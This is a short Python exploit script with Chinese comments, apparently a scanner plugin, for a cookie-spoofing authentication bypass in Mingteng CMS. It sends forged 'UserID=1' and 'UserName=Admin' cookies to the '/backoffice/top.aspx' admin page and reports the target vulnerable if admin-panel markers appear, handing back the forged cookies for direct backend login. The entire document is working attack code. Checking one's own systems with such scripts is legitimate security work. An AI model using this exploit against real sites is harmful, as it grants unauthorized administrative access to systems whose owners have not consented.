#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 明腾cms cookie欺骗漏洞
referer: unknown
author: Lucifer
description: 存在cookie欺骗漏洞,直接登录后台。
'''
import sys
import requests
import warnings
def run(url):
        result = ['明腾cms cookie欺骗漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        }
        payload = "/backoffice/top.aspx"
        vulnurl = url + payload
        try:
            mycookies = { "UserID":"1", "UserName":"Admin", "path":"/" }
            sess = requests.Session()
            req = sess.get(vulnurl, headers=headers, cookies=mycookies, timeout=10, verify=False)
            if r"Admin" in req.text and r"SysSet/Default.aspx" in req.text:
                result[2]=  '存在'
                result[1]=  vulnurl+"\t设置cookies为: "+str(mycookies)
                return result
            elif r"Admin" in req.text and r"PassWords.aspx" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl+"\t设置cookies为: "+str(mycookies)
                return result
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    
